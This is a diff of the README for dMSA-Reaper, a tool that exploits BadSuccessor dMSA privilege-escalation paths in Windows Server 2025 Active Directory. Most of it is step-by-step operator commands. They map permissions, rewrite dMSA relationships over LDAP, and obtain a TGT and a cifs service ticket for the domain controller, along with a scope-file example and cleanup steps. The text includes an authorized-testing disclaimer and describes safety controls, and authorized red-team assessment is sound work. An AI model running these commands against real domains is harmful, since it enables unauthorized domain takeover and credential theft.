@@ -1,110 +1,118 @@
 # dMSA-Reaper
 
-dMSA-Reaper finds and exploits BadSuccessor paths in Windows Server 2025
-Active Directory. Given domain credentials and a domain controller, it maps
-dMSA permissions, selects an executable path, creates or modifies the required
-dMSA relationship, and obtains a Kerberos service ticket through it.
-
-Each exploitation run is journaled. `--dry-run` shows the LDAP changes before
-execution, and `cleanup` removes only the changes made by that operation.
+dMSA-Reaper maps and exploits BadSuccessor paths in Windows Server 2025
+Active Directory. Its operator flow is deliberately small:
 
 ```text
-map -> paths -> exploit -> ticket
-                         -> cleanup
+map -> paths -> exploit -> tgt/ticket -> cleanup
 ```
 
-Use dMSA-Reaper only in an Active Directory environment you are authorized to
-test.
+Use it only in an Active Directory environment you are authorized to test.
 
 ## Install
 
 ```bash
-python -m venv .venv
+python3 -m venv .venv
 . .venv/bin/activate
-pip install -e ".[dev]"
+pip install .
 ```
 
-## Usage
+## Quick start
 
 Map the domain:
 
 ```bash
 dmsa-reaper map \
-  --domain corp.local --dc-ip 10.0.0.10 \
-  -u analyst -p 'pass' --use-ldaps \
-  --json state.json
+  -d corp.local --dc-ip 10.0.0.10 \
+  -u analyst -p 'pass' --use-ldaps
 ```
 
-List exploitable paths:
+List modern executable paths. Add `--legacy` when assessing an unpatched
+domain controller:
 
 ```bash
-dmsa-reaper paths \
-  --state state.json --expand-targets \
-  --json paths.json
+dmsa-reaper paths --state state.json
 ```
 
-Preview a path:
+LDAP writes use a small scope file. For example:
+
+```json
+{
+  "domain": "corp.local",
+  "allowedOUs": [
+    "OU=Service Accounts,DC=corp,DC=local"
+  ],
+  "allowedTargets": [
+    "CN=target,CN=Users,DC=corp,DC=local"
+  ],
+  "allowDaclPrimitives": false,
+  "requireConfirmString": false
+}
+```
+
+Preview a selected path:
 
 ```bash
 dmsa-reaper exploit \
-  --state state.json --paths paths.json \
-  --path BS-7f31... --scope scope.json \
-  --dry-run
+  --state state.json --path BS-7f31... \
+  --scope scope.json --dry-run
 ```
 
-Exploit it:
+Execute it with the same account and domain controller used for mapping:
 
 ```bash
 dmsa-reaper exploit \
-  --state state.json --paths paths.json \
-  --path BS-7f31... \
-  --domain corp.local --dc-ip 10.0.0.10 \
-  -u analyst -p 'pass' --use-ldaps \
-  --scope scope.json \
-  --confirm --confirm-string corp.local
+  --state state.json --path BS-7f31... \
+  --scope scope.json --confirm \
+  -d corp.local --dc-ip 10.0.0.10 \
+  -u analyst -p 'pass' --use-ldaps
 ```
 
-Use the operation ID returned by `exploit` to obtain a ticket:
+The command prints an operation ID. Use it to acquire the dMSA TGT:
+
+```bash
+dmsa-reaper tgt \
+  --op OP-YYYYMMDD-deadbeef \
+  --ccache /secure/operator.ccache \
+  --identity analyst
+```
+
+Or acquire the TGT and a service ticket together:
 
 ```bash
 dmsa-reaper ticket \
   --op OP-YYYYMMDD-deadbeef \
   --ccache /secure/operator.ccache \
   --identity analyst \
-  --domain corp.local \
-  --dc-host dc01.corp.local --dc-ip 10.0.0.10 \
-  --service cifs/dc01.corp.local
+  --spn cifs/dc01.corp.local
 ```
 
-The ticket and a ready-to-use handoff command are written under
-`.reaper/runs/<operation-id>/`.
+Ticket artifacts are written under `.reaper/runs/<operation-id>/`; each SPN
+gets its own cache and handoff script.
 
-Remove the operation's changes:
+Remove the LDAP changes recorded by the operation:
 
 ```bash
 dmsa-reaper cleanup \
   --op OP-YYYYMMDD-deadbeef \
-  --domain corp.local --dc-ip 10.0.0.10 \
   -u analyst -p 'pass' --use-ldaps
 ```
 
-## Operational controls
+## Kerberos LDAP authentication
 
-LDAP writes require a scope file. Created objects must be inside `allowedOUs`;
-modified objects must be inside `allowedOUs` or `allowedTargets`. DACL paths
-also require `allowDaclPrimitives=true`.
+Set `KRB5CCNAME`, pass `-k`, and still provide the account name so the tool can
+match the live identity to the mapped SID:
 
-Operation journals are stored in `.reaper/operations`. Private ccaches and
-snapshots are stored in `.reaper/runs/<operation-id>/` with mode `0600`. Use
-`--ops-dir` or `DMSA_REAPER_OPS_DIR` to change the journal directory.
+```bash
+export KRB5CCNAME=/secure/operator.ccache
+dmsa-reaper map -d corp.local --dc-ip 10.0.0.10 -u analyst -k
+```
 
-Cleanup is conflict-aware. It restores attributes only while they still match
-the operation's write, removes only ACEs inserted by the operation, and
-deletes created objects only when their `objectGUID` matches the journal.
+Password-based NTLM, LDAPS, STARTTLS, and ccache-based SASL/GSSAPI are
+supported for LDAP. Pass-the-hash, AES keys, and keytabs are not supported
+consistently by the LDAP path.
 
-Password-based NTLM, LDAPS, STARTTLS, and environment Kerberos through
-SASL/GSSAPI are supported for LDAP. Pass-the-hash, AES keys, and keytabs are
-not yet consistently supported for LDAP.
-
-`verify` is available for LDAP troubleshooting, but it is not part of the
-normal exploitation flow.
+Operation journals live in `.reaper/operations`. Cleanup restores an attribute
+only while it still contains the operation's value, removes only ACEs inserted
+by that operation, and deletes a created object only when its `objectGUID`
+matches the journal. Conflicts are left untouched and return a non-zero exit.
